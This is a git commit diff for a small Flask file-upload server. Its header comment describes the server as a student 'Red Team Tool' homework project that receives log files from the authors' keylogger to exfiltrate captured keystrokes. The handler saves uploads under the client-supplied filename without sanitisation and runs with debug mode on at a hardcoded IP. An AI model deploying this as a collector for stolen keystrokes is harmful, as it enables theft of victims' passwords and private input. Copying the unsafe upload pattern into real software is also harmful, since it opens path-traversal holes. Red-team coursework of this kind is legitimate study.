ae1650eee61a49c22a2bc3063d6d7168f5d50a21
gdk7676 <geoffreykanteles@gmail.com>
2019-02-17 20:52:26 -0500

    streamlined things, added top comment

--- file_upload/app.py
+++ file_upload/app.py
@@ -1,3 +1,8 @@
+# gdk7676@rit.edu & jmb7438@rit.edu
+# Geoff Kanteles and Jake Brown - Homework 3: Red Team Tool
+# Flask server for uploading files - meant to take the log file
+# from our keylogger for exfil of logged keystrokes
+
 import os
 from flask import Flask, render_template, request
 
@@ -5,11 +10,7 @@ app = Flask(__name__)
 
 APP_ROOT = os.path.dirname(os.path.abspath(__file__))
 
-@app.route('/')
-def index():
-    return render_template("upload.html")
-
-@app.route("/upload", methods=['POST','PUT'])
+@app.route("/", methods=['GET', 'POST'])
 def upload():
     target = os.path.join(APP_ROOT, 'recv/')
     print(target)
@@ -17,14 +18,29 @@ def upload():
     if not os.path.isdir(target):
         os.mkdir(target)
 
-    for file in request.files.getlist("file"):
-        print(file)
-        filename = file.filename
-        destination = "/".join([target, filename])
-        print(destination)
-        file.save(destination)
+    if request.method == 'POST':
+        #for key, value in request.files:
+        #    print(key, value)
+        print(request.files)
+        print(request.data)
+        file = request.files['file']
+        if file.filename == '':
+            print("No selected file!")
+            return render_template("upload.html")
+        if file:
+            destination = "/".join([target, file.filename])
+            file.save(destination)
 
-    return render_template("complete.html")
+            return render_template("complete.html")
+    return '''
+    <!doctype html>
+    <title>Upload new File</title>
+    <h1>Upload new File</h1>
+    <form method=post enctype=multipart/form-data>
+      <input type=file name=file>
+      <input type=submit value=Upload>
+    </form>
+    '''
 
 if __name__ == '__main__':
     app.run(host='129.21.157.241',port=5000,debug=True)
